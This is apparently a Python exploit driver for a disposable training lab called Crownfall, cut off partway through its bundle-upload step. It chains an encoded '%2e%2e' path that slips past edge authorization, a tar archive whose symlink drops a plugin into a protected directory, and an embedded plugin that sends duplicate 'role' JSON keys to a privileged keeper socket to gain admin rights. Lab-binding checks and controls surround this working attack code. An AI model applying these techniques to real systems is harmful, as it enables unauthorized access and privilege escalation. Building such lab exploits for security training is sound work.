#!/usr/bin/env python3
"""
crownfall
=========

Remote exploit driver for one explicitly authorized Crownfall disposable lab.

The driver demonstrates a chained boundary failure rather than a collection of
unrelated probes:

* the public edge authorizes an encoded path before the application normalizes
  it;
* the bundle importer follows an archive symlink into the fixed plugin tree;
* the plugin crosses a Unix-socket trust boundary with duplicate JSON keys;
* the privileged keeper writes a root-owned proof that the plugin cannot write
  directly;
* the driver verifies the proof and removes every created artifact.

There is deliberately no command runner, target override, path override,
scanner, persistence feature, credential collector, or redirect handling.  A
run is bound to the URL, lab identifier, key, and fingerprint in an
authorization document produced by the disposable target.
"""

from __future__ import annotations

import argparse
import errno
import hashlib
import hmac
import http.client
import io
import ipaddress
import json
import re
import secrets
import socket
import ssl
import sys
import tarfile
import time
import urllib.parse
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Final, Iterable, Mapping, Sequence


PROGRAM: Final = "crownfall"
PROTOCOL_VERSION: Final = 1
MANIFEST_SERVICE: Final = "crownfall-disposable-target"
FINGERPRINT_LABEL: Final = b"crownfall-target-v1\0"
MANIFEST_ATTESTATION_LABEL: Final = b"crownfall-manifest-v1\0"

MANIFEST_PATH: Final = "/manifest"
AMBIGUOUS_PREFIX: Final = "/public/%2e%2e/internal/admin"
BUNDLE_PATH: Final = AMBIGUOUS_PREFIX + "/bundle"
ACTIVATE_PATH: Final = AMBIGUOUS_PREFIX + "/activate"
RESULT_PATH: Final = AMBIGUOUS_PREFIX + "/result"
CLEANUP_PATH: Final = AMBIGUOUS_PREFIX + "/cleanup"
DIRECT_BUNDLE_PATH: Final = "/internal/admin/bundle"

PLUGIN_NAME: Final = "crown_probe.py"
PLUGIN_DESTINATION: Final = "/srv/crownfall/plugins"
PLUGIN_SYMLINK_TARGET: Final = "../plugins"
RESULT_DESTINATION: Final = "/srv/crownfall/results"
PROOF_DESTINATION: Final = "/srv/crownfall/proofs"
KEEPER_SOCKET: Final = "/run/crownfall/keeper.sock"

AUTHORIZATION_MAX_BYTES: Final = 16 * 1024
MANIFEST_MAX_BYTES: Final = 16 * 1024
JSON_RESPONSE_MAX_BYTES: Final = 256 * 1024
BUNDLE_MAX_BYTES: Final = 256 * 1024
KEEPER_MESSAGE_MAX_BYTES: Final = 4096
HTTP_BODY_HARD_MAX: Final = 512 * 1024

LAB_ID_RE: Final = re.compile(r"^[a-z0-9][a-z0-9-]{7,47}$")
HEX32_RE: Final = re.compile(r"^[0-9a-f]{32}$")
HEX64_RE: Final = re.compile(r"^[0-9a-f]{64}$")


class CrownfallError(Exception):
    """Base class for failures that should be rendered without a traceback."""


class AuthorizationError(CrownfallError):
    """The local authorization document is missing, malformed, or inconsistent."""


class DestinationError(CrownfallError):
    """The authorized URL violates the destination policy."""


class TransportError(CrownfallError):
    """A bounded HTTP exchange failed."""


class ProtocolError(CrownfallError):
    """The target returned a response outside the Crownfall protocol."""


class VerificationError(CrownfallError):
    """Observed evidence did not prove an expected boundary transition."""


class RunDeadlineExceeded(CrownfallError):
    """The total run deadline expired."""


def _reject_json_constant(value: str) -> None:
    raise ValueError(f"non-finite JSON number is forbidden: {value}")


def _reject_duplicate_pairs(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise ValueError(f"duplicate response key: {key}")
        result[key] = value
    return result


def decode_json_document(raw: bytes, *, label: str) -> Any:
    """Decode a bounded UTF-8 JSON document and reject ambiguous objects."""
    try:
        text = raw.decode("utf-8", errors="strict")
    except UnicodeDecodeError as exc:
        raise ProtocolError(f"{label} is not valid UTF-8") from exc
    try:
        return json.loads(
            text,
            object_pairs_hook=_reject_duplicate_pairs,
            parse_constant=_reject_json_constant,
        )
    except (ValueError, json.JSONDecodeError) as exc:
        raise ProtocolError(f"{label} is not strict JSON: {exc}") from exc


def encode_json_document(value: Any) -> bytes:
    return json.dumps(
        value,
        ensure_ascii=True,
        allow_nan=False,
        separators=(",", ":"),
        sort_keys=True,
    ).encode("utf-8")


def require_object(value: Any, *, label: str) -> dict[str, Any]:
    if not isinstance(value, dict):
        raise ProtocolError(f"{label} must be a JSON object")
    if not all(isinstance(key, str) for key in value):
        raise ProtocolError(f"{label} contains a non-string key")
    return value


def require_string(
    obj: Mapping[str, Any],
    key: str,
    *,
    label: str,
    pattern: re.Pattern[str] | None = None,
    maximum: int = 4096,
) -> str:
    value = obj.get(key)
    if not isinstance(value, str):
        raise ProtocolError(f"{label}.{key} must be a string")
    if not value or len(value) > maximum:
        raise ProtocolError(f"{label}.{key} has an invalid length")
    if pattern is not None and pattern.fullmatch(value) is None:
        raise ProtocolError(f"{label}.{key} has an invalid format")
    return value


def require_boolean(obj: Mapping[str, Any], key: str, *, label: str) -> bool:
    value = obj.get(key)
    if not isinstance(value, bool):
        raise ProtocolError(f"{label}.{key} must be a boolean")
    return value


def require_integer(obj: Mapping[str, Any], key: str, *, label: str) -> int:
    value = obj.get(key)
    if isinstance(value, bool) or not isinstance(value, int):
        raise ProtocolError(f"{label}.{key} must be an integer")
    return value


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def constant_time_hex_equal(left: str, right: str) -> bool:
    return len(left) == len(right) and hmac.compare_digest(left, right)


@dataclass(frozen=True)
class Authorization:
    base_url: str
    lab_id: str
    outer_key: bytes = field(repr=False)
    target_fingerprint: str

    @classmethod
    def load(cls, source: Path) -> "Authorization":
        try:
            stat = source.stat()
        except OSError as exc:
            raise AuthorizationError(f"cannot inspect authorization file: {exc}") from exc
        if not source.is_file():
            raise AuthorizationError("authorization path is not a regular file")
        if stat.st_size <= 0 or stat.st_size > AUTHORIZATION_MAX_BYTES:
            raise AuthorizationError("authorization file has an invalid size")
        try:
            raw = source.read_bytes()
        except OSError as exc:
            raise AuthorizationError(f"cannot read authorization file: {exc}") from exc
        try:
            value = decode_json_document(raw, label="authorization")
        except ProtocolError as exc:
            raise AuthorizationError(str(exc)) from exc
        obj = require_object(value, label="authorization")
        required = {
            "service",
            "protocol",
            "base_url",
            "lab_id",
            "outer_key_hex",
            "target_fingerprint",
        }
        if set(obj) != required:
            missing = sorted(required - set(obj))
            extra = sorted(set(obj) - required)
            raise AuthorizationError(
                f"authorization keys do not match schema; missing={missing}, extra={extra}"
            )

        if obj["service"] != MANIFEST_SERVICE:
            raise AuthorizationError("authorization.service does not identify Crownfall")
        if obj["protocol"] != PROTOCOL_VERSION:
            raise AuthorizationError("authorization.protocol does not match this client")
        base_url = obj["base_url"]
        lab_id = obj["lab_id"]
        key_hex = obj["outer_key_hex"]
        fingerprint = obj["target_fingerprint"]
        if not isinstance(base_url, str) or not base_url:
            raise AuthorizationError("authorization.base_url must be a non-empty string")
        if not isinstance(lab_id, str) or LAB_ID_RE.fullmatch(lab_id) is None:
            raise AuthorizationError("authorization.lab_id has an invalid format")
        if not isinstance(key_hex, str) or HEX64_RE.fullmatch(key_hex) is None:
            raise AuthorizationError("authorization.outer_key_hex must be 64 lowercase hex characters")
        if not isinstance(fingerprint, str) or HEX64_RE.fullmatch(fingerprint) is None:
            raise AuthorizationError(
                "authorization.target_fingerprint must be 64 lowercase hex characters"
            )
        outer_key = bytes.fromhex(key_hex)
        expected = hmac.new(
            outer_key,
            FINGERPRINT_LABEL + lab_id.encode("ascii"),
            hashlib.sha256,
        ).hexdigest()
        if not constant_time_hex_equal(fingerprint, expected):
            raise AuthorizationError(
                "authorization fingerprint does not match its key and lab identifier"
            )
        return cls(
            base_url=base_url,
            lab_id=lab_id,
            outer_key=outer_key,
            target_fingerprint=fingerprint,
        )


@dataclass(frozen=True)
class Endpoint:
    scheme: str
    hostname: str
    port: int
    host_header: str
    pinned_ip: str
    base_url: str

    @staticmethod
    def _address_is_private_or_loopback(address: ipaddress.IPv4Address | ipaddress.IPv6Address) -> bool:
        return address.is_loopback or address.is_private

    @classmethod
    def from_authorization(cls, base_url: str) -> "Endpoint":
        try:
            parsed = urllib.parse.urlsplit(base_url)
        except ValueError as exc:
            raise DestinationError(f"cannot parse authorized base URL: {exc}") from exc
        if parsed.scheme not in {"http", "https"}:
            raise DestinationError("authorized base URL scheme must be http or https")
        if not parsed.hostname:
            raise DestinationError("authorized base URL has no hostname")
        if parsed.username is not None or parsed.password is not None:
            raise DestinationError("credentials in the authorized base URL are forbidden")
        if parsed.query or parsed.fragment:
            raise DestinationError("authorized base URL cannot contain a query or fragment")
        if parsed.path not in {"", "/"}:
            raise DestinationError("authorized base URL must not contain an application path")
        try:
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
        except ValueError as exc:
            raise DestinationError(f"authorized base URL port is invalid: {exc}") from exc
        if not (1 <= port <= 65535):
            raise DestinationError("authorized base URL port is outside 1..65535")

        hostname = parsed.hostname.rstrip(".").lower()
        if not hostname:
            raise DestinationError("authorized hostname is empty")
        try:
            records = socket.getaddrinfo(
                hostname,
                port,
                family=socket.AF_UNSPEC,
                type=socket.SOCK_STREAM,
                proto=socket.IPPROTO_TCP,
            )
        except OSError as exc:
            raise DestinationError(f"authorized hostname resolution failed: {exc}") from exc
        addresses: list[str] = []
        for record in records:
            raw_address = record[4][0]
            canonical = str(ipaddress.ip_address(raw_address))
            if canonical not in addresses:
                addresses.append(canonical)
        if not addresses:
            raise DestinationError("authorized hostname resolved to no addresses")
        if parsed.scheme == "http":
            non_private = [
                item
                for item in addresses
                if not cls._address_is_private_or_loopback(ipaddress.ip_address(item))
            ]
            if non_private:
                raise DestinationError(
                    "plain HTTP is permitted only when every resolved address is private or loopback"
                )

        ipv6_literal = ":" in hostname
        rendered_host = f"[{hostname}]" if ipv6_literal else hostname
        default_port = 443 if parsed.scheme == "https" else 80
        host_header = rendered_host if port == default_port else f"{rendered_host}:{port}"
        normalized_url = f"{parsed.scheme}://{host_header}"
        return cls(
            scheme=parsed.scheme,
            hostname=hostname,
            port=port,
            host_header=host_header,
            pinned_ip=addresses[0],
            base_url=normalized_url,
        )


@dataclass(frozen=True)
class HttpResponse:
    method: str
    raw_path: str
    status: int
    reason: str
    headers: dict[str, str]
    body: bytes
    peer_ip: str
    elapsed_ms: float

    def json_object(self, *, label: str) -> dict[str, Any]:
        content_type = self.headers.get("content-type", "").split(";", 1)[0].strip().lower()
        if content_type != "application/json":
            raise ProtocolError(f"{label} response Content-Type is not application/json")
        return require_object(decode_json_document(self.body, label=label), label=label)


class _PinnedHTTPConnection(http.client.HTTPConnection):
    def __init__(self, endpoint: Endpoint, timeout: float) -> None:
        super().__init__(endpoint.hostname, endpoint.port, timeout=timeout)
        self._endpoint = endpoint

    def connect(self) -> None:
        self.sock = socket.create_connection(
            (self._endpoint.pinned_ip, self._endpoint.port),
            self.timeout,
        )
        self.sock.settimeout(self.timeout)


class _PinnedHTTPSConnection(_PinnedHTTPConnection):
    def __init__(self, endpoint: Endpoint, timeout: float) -> None:
        super().__init__(endpoint, timeout)
        self._context = ssl.create_default_context()

    def connect(self) -> None:
        plain = socket.create_connection(
            (self._endpoint.pinned_ip, self._endpoint.port),
            self.timeout,
        )
        plain.settimeout(self.timeout)
        try:
            self.sock = self._context.wrap_socket(
                plain,
                server_hostname=self._endpoint.hostname,
            )
        except Exception:
            plain.close()
            raise


class PinnedTransport:
    """One-request connections pinned to the address used for the manifest."""

    def __init__(self, endpoint: Endpoint, *, timeout: float) -> None:
        self.endpoint = endpoint
        self.timeout = timeout

    @staticmethod
    def _validate_request(method: str, raw_path: str, headers: Mapping[str, str], body: bytes) -> None:
        if method not in {"GET", "POST"}:
            raise TransportError("method is outside the fixed protocol")
        if not raw_path.startswith("/") or "#" in raw_path:
            raise TransportError("raw request path is invalid")
        if "\r" in raw_path or "\n" in raw_path or " " in raw_path:
            raise TransportError("raw request path contains forbidden characters")
        try:
            raw_path.encode("ascii", errors="strict")
        except UnicodeEncodeError as exc:
            raise TransportError("raw request path must be ASCII") from exc
        if len(body) > HTTP_BODY_HARD_MAX:
            raise TransportError("request body exceeds the hard protocol limit")
        for name, value in headers.items():
            if not isinstance(name, str) or not isinstance(value, str):
                raise TransportError("HTTP header names and values must be strings")
            if "\r" in name or "\n" in name or "\r" in value or "\n" in value:
                raise TransportError("HTTP header contains a line break")

    def request(
        self,
        method: str,
        raw_path: str,
        *,
        headers: Mapping[str, str] | None = None,
        body: bytes = b"",
        response_limit: int = JSON_RESPONSE_MAX_BYTES,
    ) -> HttpResponse:
        outgoing = dict(headers or {})
        self._validate_request(method, raw_path, outgoing, body)
        if response_limit <= 0 or response_limit > HTTP_BODY_HARD_MAX:
            raise TransportError("response limit is outside the protocol bounds")

        connection_type = (
            _PinnedHTTPSConnection if self.endpoint.scheme == "https" else _PinnedHTTPConnection
        )
        connection = connection_type(self.endpoint, self.timeout)
        started = time.monotonic()
        response: http.client.HTTPResponse | None = None
        try:
            connection.putrequest(
                method,
                raw_path,
                skip_host=True,
                skip_accept_encoding=True,
            )
            connection.putheader("Host", self.endpoint.host_header)
            connection.putheader("Accept", "application/json")
            connection.putheader("Connection", "close")
            for name, value in outgoing.items():
                connection.putheader(name, value)
            connection.putheader("Content-Length", str(len(body)))
            connection.endheaders(body)
            response = connection.getresponse()
            content_length = response.getheader("Content-Length")
            if content_length is not None:
                try:
                    declared = int(content_length, 10)
                except ValueError as exc:
                    raise TransportError("response Content-Length is not decimal") from exc
                if declared < 0 or declared > response_limit:
                    raise TransportError("response Content-Length exceeds the request bound")
            received = response.read(response_limit + 1)
            if len(received) > response_limit:
                raise TransportError("response body exceeds the request bound")
            combined_headers: dict[str, str] = {}
            for name, value in response.getheaders():
                lowered = name.lower()
                if lowered in combined_headers:
                    combined_headers[lowered] += ", " + value
                else:
                    combined_headers[lowered] = value
            return HttpResponse(
                method=method,
                raw_path=raw_path,
                status=response.status,
                reason=response.reason,
                headers=combined_headers,
                body=received,
                peer_ip=self.endpoint.pinned_ip,
                elapsed_ms=round((time.monotonic() - started) * 1000.0, 3),
            )
        except (OSError, ssl.SSLError, http.client.HTTPException) as exc:
            raise TransportError(
                f"{method} {raw_path} to pinned target failed: {exc}"
            ) from exc
        finally:
            if response is not None:
                response.close()
            connection.close()


@dataclass
class TimelineEvent:
    sequence: int
    elapsed_ms: float
    event: str
    observed: dict[str, Any]


class Timeline:
    def __init__(self, *, quiet: bool) -> None:
        self._started = time.monotonic()
        self._quiet = quiet
        self.events: list[TimelineEvent] = []

    def add(self, event: str, **observed: Any) -> None:
        item = TimelineEvent(
            sequence=len(self.events) + 1,
            elapsed_ms=round((time.monotonic() - self._started) * 1000.0, 3),
            event=event,
            observed=observed,
        )
        self.events.append(item)
        if not self._quiet:
            summary = " ".join(f"{key}={value}" for key, value in observed.items())
            print(f"[{item.sequence:02d}] {event}{(' ' + summary) if summary else ''}", file=sys.stderr)


class RunDeadline:
    def __init__(self, seconds: float) -> None:
        self._deadline = time.monotonic() + seconds

    def check(self, stage: str) -> None:
        if time.monotonic() >= self._deadline:
            raise RunDeadlineExceeded(f"total run deadline expired during {stage}")

    def remaining(self) -> float:
        return max(0.0, self._deadline - time.monotonic())


@dataclass(frozen=True)
class PreparedRequest:
    method: str
    raw_path: str
    headers: dict[str, str]
    body: bytes


class SignedProtocol:
    """Create and send requests whose authorization covers the raw path bytes."""

    _SIGNED_PATHS = {BUNDLE_PATH, ACTIVATE_PATH, CLEANUP_PATH, DIRECT_BUNDLE_PATH}

    def __init__(
        self,
        authorization: Authorization,
        transport: PinnedTransport,
        timeline: Timeline,
    ) -> None:
        self.authorization = authorization
        self.transport = transport
        self.timeline = timeline

    @classmethod
    def _path_is_fixed(cls, raw_path: str) -> bool:
        if raw_path in cls._SIGNED_PATHS:
            return True
        prefix = RESULT_PATH + "?proof_nonce="
        return raw_path.startswith(prefix) and HEX32_RE.fullmatch(raw_path[len(prefix) :]) is not None

    def prepare(
        self,
        method: str,
        raw_path: str,
        *,
        body: bytes = b"",
        content_type: str | None = None,
    ) -> PreparedRequest:
        if not self._path_is_fixed(raw_path):
            raise ProtocolError("attempted request path is outside the fixed Crownfall protocol")
        method = method.upper()
        timestamp = str(int(time.time()))
        nonce = secrets.token_hex(16)
        body_hash = sha256_hex(body)
        canonical = "\n".join(
            (
                method,
                raw_path,
                self.authorization.lab_id,
                timestamp,
                nonce,
                body_hash,
            )
        ).encode("utf-8")
        mac = hmac.new(
            self.authorization.outer_key,
            canonical,
            hashlib.sha256,
        ).hexdigest()
        headers = {
            "X-Crownfall-Lab": self.authorization.lab_id,
            "X-Crownfall-Time": timestamp,
            "X-Crownfall-Nonce": nonce,
            "X-Crownfall-Mac": mac,
            "X-Application-Role": "guest",
        }
        if content_type is not None:
            headers["Content-Type"] = content_type
        return PreparedRequest(method=method, raw_path=raw_path, headers=headers, body=body)

    def send(
        self,
        prepared: PreparedRequest,
        *,
        response_limit: int = JSON_RESPONSE_MAX_BYTES,
        event: str,
    ) -> HttpResponse:
        response = self.transport.request(
            prepared.method,
            prepared.raw_path,
            headers=prepared.headers,
            body=prepared.body,
            response_limit=response_limit,
        )
        self.timeline.add(
            event,
            method=prepared.method,
            path=prepared.raw_path,
            status=response.status,
            response_bytes=len(response.body),
            elapsed_ms=response.elapsed_ms,
        )
        return response

    def request(
        self,
        method: str,
        raw_path: str,
        *,
        body: bytes = b"",
        content_type: str | None = None,
        response_limit: int = JSON_RESPONSE_MAX_BYTES,
        event: str,
    ) -> HttpResponse:
        prepared = self.prepare(
            method,
            raw_path,
            body=body,
            content_type=content_type,
        )
        return self.send(prepared, response_limit=response_limit, event=event)


_PLUGIN_TEMPLATE: Final = r'''#!/usr/bin/env python3
from __future__ import annotations

import errno
import json
import os
import re
import socket
import struct

KEEPER_LIMIT = 4096
PROOF_ROOT = "/srv/crownfall/proofs"
HEX32 = re.compile(r"^[0-9a-f]{32}$")
HEX64 = re.compile(r"^[0-9a-f]{64}$")


def _json_bytes(value):
    return json.dumps(value, ensure_ascii=True, allow_nan=False,
                      separators=(",", ":"), sort_keys=True).encode("utf-8")


def _recv_exact(stream, count):
    pieces = []
    remaining = count
    while remaining:
        piece = stream.recv(remaining)
        if not piece:
            raise RuntimeError("keeper closed a framed response early")
        pieces.append(piece)
        remaining -= len(piece)
    return b"".join(pieces)


def _exchange(socket_path, message):
    if not isinstance(message, bytes) or not (1 <= len(message) <= KEEPER_LIMIT):
        raise RuntimeError("keeper request length is outside protocol bounds")
    stream = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    stream.settimeout(4.0)
    try:
        stream.connect(socket_path)
        stream.sendall(struct.pack(">I", len(message)) + message)
        length = struct.unpack(">I", _recv_exact(stream, 4))[0]
        if not (1 <= length <= KEEPER_LIMIT):
            raise RuntimeError("keeper response length is outside protocol bounds")
        reply_raw = _recv_exact(stream, length)
    finally:
        stream.close()
    reply = json.loads(reply_raw.decode("utf-8"))
    if not isinstance(reply, dict):
        raise RuntimeError("keeper response is not an object")
    return reply_raw, reply


def _direct_write_control(proof_nonce):
    target = os.path.join(PROOF_ROOT, proof_nonce + ".proof")
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    try:
        descriptor = os.open(target, flags, 0o600)
    except OSError as exc:
        return {
            "attempted": True,
            "allowed": False,
            "errno": exc.errno,
            "error_name": errno.errorcode.get(exc.errno, "UNKNOWN"),
            "path": target,
        }
    else:
        os.close(descriptor)
        return {
            "attempted": True,
            "allowed": True,
            "errno": 0,
            "error_name": "NONE",
            "path": target,
        }


def main():
    socket_path = os.environ["CROWNFALL_KEEPER_SOCKET"]
    lab_id = os.environ["CROWNFALL_LAB_ID"]
    proof_nonce = os.environ["CROWNFALL_PROOF_NONCE"]
    plugin_sha256 = os.environ["CROWNFALL_PLUGIN_SHA256"]
    if socket_path != "/run/crownfall/keeper.sock":
        raise RuntimeError("unexpected keeper socket")
    if not lab_id or len(lab_id) > 64:
        raise RuntimeError("invalid lab identifier")
    if HEX32.fullmatch(proof_nonce) is None:
        raise RuntimeError("invalid proof nonce")
    if HEX64.fullmatch(plugin_sha256) is None:
        raise RuntimeError("invalid plugin digest")

    direct = _direct_write_control(proof_nonce)
    clean = _json_bytes({
        "role": "guest",
        "op": "write_proof",
        "lab_id": lab_id,
        "proof_nonce": proof_nonce,
        "plugin_sha256": plugin_sha256,
    })
    clean_raw, clean_reply = _exchange(socket_path, clean)

    quoted_lab = json.dumps(lab_id, ensure_ascii=True)
    quoted_nonce = json.dumps(proof_nonce, ensure_ascii=True)
    quoted_digest = json.dumps(plugin_sha256, ensure_ascii=True)
    duplicate = (
        "{\"role\":\"guest\",\"op\":\"write_proof\",\"lab_id\":" + quoted_lab +
        ",\"proof_nonce\":" + quoted_nonce + ",\"plugin_sha256\":" + quoted_digest +
        ",\"role\":\"admin\"}"
    ).encode("utf-8")
    duplicate_raw, duplicate_reply = _exchange(socket_path, duplicate)

    result = {
        "plugin_pid": os.getpid(),
        "plugin_uid": os.getuid(),
        "plugin_euid": os.geteuid(),
        "plugin_gid": os.getgid(),
        "plugin_egid": os.getegid(),
        "plugin_sha256": plugin_sha256,
        "proof_nonce": proof_nonce,
        "direct_write": direct,
        "clean_control": clean_reply,
        "duplicate_attack": duplicate_reply,
    }
    print(json.dumps(result, ensure_ascii=True, allow_nan=False,
                     separators=(",", ":"), sort_keys=True))


if __name__ == "__main__":
    main()
'''


@dataclass(frozen=True)
class AttackMaterial:
    proof_nonce: str
    plugin: bytes
    plugin_sha256: str
    bundle: bytes
    bundle_sha256: str
    bundle_members: tuple[str, ...]


def build_plugin() -> bytes:
    return _PLUGIN_TEMPLATE.encode("utf-8")


def _tar_info(name: str, *, mode: int, type_: bytes, size: int = 0) -> tarfile.TarInfo:
    info = tarfile.TarInfo(name)
    info.mode = mode
    info.type = type_
    info.size = size
    info.uid = 10001
    info.gid = 10001
    info.uname = "crownfall"
    info.gname = "crownfall"
    info.mtime = 1
    return info


def build_bundle(plugin: bytes) -> tuple[bytes, tuple[str, ...]]:
    members = (
        "notes/",
        "bridge",
        "bridge/crown_probe.py",
    )
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w", format=tarfile.USTAR_FORMAT) as archive:
        directory = _tar_info(members[0], mode=0o755, type_=tarfile.DIRTYPE)
        archive.addfile(directory)

        symlink = _tar_info(members[1], mode=0o777, type_=tarfile.SYMTYPE)
        symlink.linkname = PLUGIN_SYMLINK_TARGET
        archive.addfile(symlink)

        source = _tar_info(
            members[2],
            mode=0o700,
            type_=tarfile.REGTYPE,
            size=len(plugin),
        )
        archive.addfile(source, io.BytesIO(plugin))
    payload = buffer.getvalue()
    if len(payload) > BUNDLE_MAX_BYTES:
        raise VerificationError("generated bundle exceeds the target's fixed limit")
    verify_bundle(payload, expected_plugin=plugin, expected_members=members)
    return payload, members


def verify_bundle(
    payload: bytes,
    *,
    expected_plugin: bytes,
    expected_members: Sequence[str],
) -> None:
    """Verify member ordering and link semantics without extracting anything."""
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:") as archive:
        members = archive.getmembers()
        observed_names = [item.name for item in members]
        if observed_names != [name.rstrip("/") for name in expected_members]:
            raise VerificationError(f"generated archive members changed: {observed_names}")
        if not members[0].isdir():
            raise VerificationError("first archive member is not the staging directory")
        if not members[1].issym() or members[1].linkname != PLUGIN_SYMLINK_TARGET:
            raise VerificationError("second archive member is not the fixed plugin symlink")
        if not members[2].isfile():
            raise VerificationError("third archive member is not the plugin file")
        extracted = archive.extractfile(members[2])
        if extracted is None or extracted.read() != expected_plugin:
            raise VerificationError("archive plugin bytes do not match the generated plugin")


def make_attack_material() -> AttackMaterial:
    proof_nonce = secrets.token_hex(16)
    plugin = build_plugin()
    bundle, members = build_bundle(plugin)
    return AttackMaterial(
        proof_nonce=proof_nonce,
        plugin=plugin,
        plugin_sha256=sha256_hex(plugin),
        bundle=bundle,
        bundle_sha256=sha256_hex(bundle),
        bundle_members=tuple(name.rstrip("/") for name in members),
    )


def response_error_code(response: HttpResponse) -> str | None:
    if not response.body:
        return None
    try:
        obj = response.json_object(label="error response")
    except ProtocolError:
        return None
    value = obj.get("error")
    return value if isinstance(value, str) else None


def expect_status(response: HttpResponse, allowed: Iterable[int], *, stage: str) -> None:
    allowed_set = set(allowed)
    if response.status not in allowed_set:
        error = response_error_code(response)
        suffix = f", error={error}" if error is not None else ""
        raise ProtocolError(
            f"{stage} returned HTTP {response.status}; expected {sorted(allowed_set)}{suffix}"
        )


@dataclass
class RunReport:
    program: str
    protocol: int
    success: bool
    lab_id: str
    authorized_base_url: str
    pinned_peer_ip: str
    target_fingerprint: str
    expectations: dict[str, Any]
    observed: dict[str, Any]
    controls: dict[str, Any]
    cleanup: dict[str, Any]
    timeline: list[dict[str, Any]]
    elapsed_ms: float


class CrownfallRun:
    def __init__(
        self,
        authorization: Authorization,
        endpoint: Endpoint,
        *,
        request_timeout: float,
        total_timeout: float,
        poll_timeout: float,
        poll_interval: float,
        quiet: bool,
    ) -> None:
        self.authorization = authorization
        self.endpoint = endpoint
        self.transport = PinnedTransport(endpoint, timeout=request_timeout)
        self.timeline = Timeline(quiet=quiet)
        self.protocol = SignedProtocol(authorization, self.transport, self.timeline)
        self.deadline = RunDeadline(total_timeout)
        self.poll_timeout = poll_timeout
        self.poll_interval = poll_interval
        self.controls: dict[str, Any] = {}
        self.observed: dict[str, Any] = {}
        self.cleanup_evidence: dict[str, Any] = {"attempted": False, "verified": False}

    def verify_manifest(self) -> dict[str, Any]:
        self.deadline.check("manifest")
        challenge = secrets.token_hex(16)
        raw_path = MANIFEST_PATH + "?challenge=" + challenge
        response = self.transport.request(
            "GET",
            raw_path,
            response_limit=MANIFEST_MAX_BYTES,
        )
        self.timeline.add(
            "manifest_received",
            peer_ip=response.peer_ip,
            status=response.status,
            response_bytes=len(response.body),
            elapsed_ms=response.elapsed_ms,
        )
        expect_status(response, {200}, stage="manifest")
        manifest = response.json_object(label="manifest")
        if manifest.get("service") != MANIFEST_SERVICE:
            raise AuthorizationError("manifest service marker does not match Crownfall")
        if manifest.get("protocol") != PROTOCOL_VERSION:
            raise AuthorizationError("manifest protocol version does not match the client")
        if manifest.get("lab_id") != self.authorization.lab_id:
            raise AuthorizationError("manifest lab identifier does not match authorization")
        fingerprint = manifest.get("target_fingerprint")
        if not isinstance(fingerprint, str) or not constant_time_hex_equal(
            fingerprint,
            self.authorization.target_fingerprint,
        ):
            raise AuthorizationError("manifest target fingerprint does not match authorization")
        if manifest.get("challenge") != challenge:
            raise AuthorizationError("manifest did not echo the fresh client challenge")
        attestation = manifest.get("attestation_mac")
        if not isinstance(attestation, str) or HEX64_RE.fullmatch(attestation) is None:
            raise AuthorizationError("manifest attestation MAC is missing or malformed")
        attestation_material = (
            MANIFEST_ATTESTATION_LABEL
            + challenge.encode("ascii")
            + b"\0"
            + self.authorization.lab_id.encode("ascii")
            + b"\0"
            + fingerprint.encode("ascii")
            + b"\0"
            + str(PROTOCOL_VERSION).encode("ascii")
        )
        expected_attestation = hmac.new(
            self.authorization.outer_key,
            attestation_material,
            hashlib.sha256,
        ).hexdigest()
        if not constant_time_hex_equal(attestation, expected_attestation):
            raise AuthorizationError("manifest challenge attestation is invalid")
        self.timeline.add(
            "authorization_bound",
            lab_id=self.authorization.lab_id,
            fingerprint=fingerprint,
            challenge=challenge,
            attestation_verified=True,
            pinned_peer_ip=response.peer_ip,
        )
        self.observed["manifest"] = manifest
        return manifest

    def control_direct_protected_route(self, benign_bundle: bytes) -> None:
        self.deadline.check("direct route control")
        response = self.protocol.request(
            "POST",
            DIRECT_BUNDLE_PATH,
            body=benign_bundle,
            content_type="application/x-tar",
            event="control_direct_admin_route",
        )
        if response.status != 403:
            raise VerificationError(
                f"direct protected route was not rejected as guest; status={response.status}"
            )
        self.controls["direct_protected_route"] = {
            "expected_status": 403,
            "observed_status": response.status,
            "error": response_error_code(response),
            "passed": True,
        }

    def control_bad_mac(self, proof_nonce: str) -> None:
        self.deadline.check("bad MAC control")
        raw_path = RESULT_PATH + "?proof_nonce=" + proof_nonce
        prepared = self.protocol.prepare("GET", raw_path)
        headers = dict(prepared.headers)
        valid = headers["X-Crownfall-Mac"]
        headers["X-Crownfall-Mac"] = ("0" if valid[0] != "0" else "1") + valid[1:]
        altered = PreparedRequest(
            method=prepared.method,
            raw_path=prepared.raw_path,
            headers=headers,
            body=prepared.body,
        )
        response = self.protocol.send(altered, event="control_bad_mac")
        if response.status != 401:
            raise VerificationError(f"bad MAC control was not rejected; status={response.status}")
        self.controls["bad_mac"] = {
            "expected_status": 401,
            "observed_status": response.status,
            "error": response_error_code(response),
            "passed": True,
        }

    def control_replay(self, proof_nonce: str) -> None:
        self.deadline.check("replay control")
        raw_path = RESULT_PATH + "?proof_nonce=" + proof_nonce
        prepared = self.protocol.prepare("GET", raw_path)
        first = self.protocol.send(prepared, event="control_replay_first_use")
        if first.status != 404:
            raise VerificationError(
                f"fresh replay-control request should find no result; status={first.status}"
            )
        second = self.protocol.send(prepared, event="control_replay_second_use")
        if second.status != 409:
            raise VerificationError(f"replayed signature was not rejected; status={second.status}")
        self.controls["replay"] = {
            "first_expected_status": 404,
            "first_observed_status": first.status,
            "second_expected_status": 409,
            "second_observed_status": second.status,
            "error": response_error_code(second),
            "passed": True,
        }

    def upload_bundle(self, material: AttackMaterial) -> dict[str, Any]:
        self.deadline.check("bundle upload")
        response = self.protocol.request(
            "POST",
            BUNDLE_PATH,
            body=material.bundle,
            content_type="application/x-tar",
            event="ambiguous_path_bundle_uploaded",
        )
        expect_status(response, {201}, stage="bundle upload")
        obj = response.json_object(label="bundle response")
        if require_boolean(obj, "ok", label="bundle response") is not True:
            raise VerificationError("bundle response did not report success")
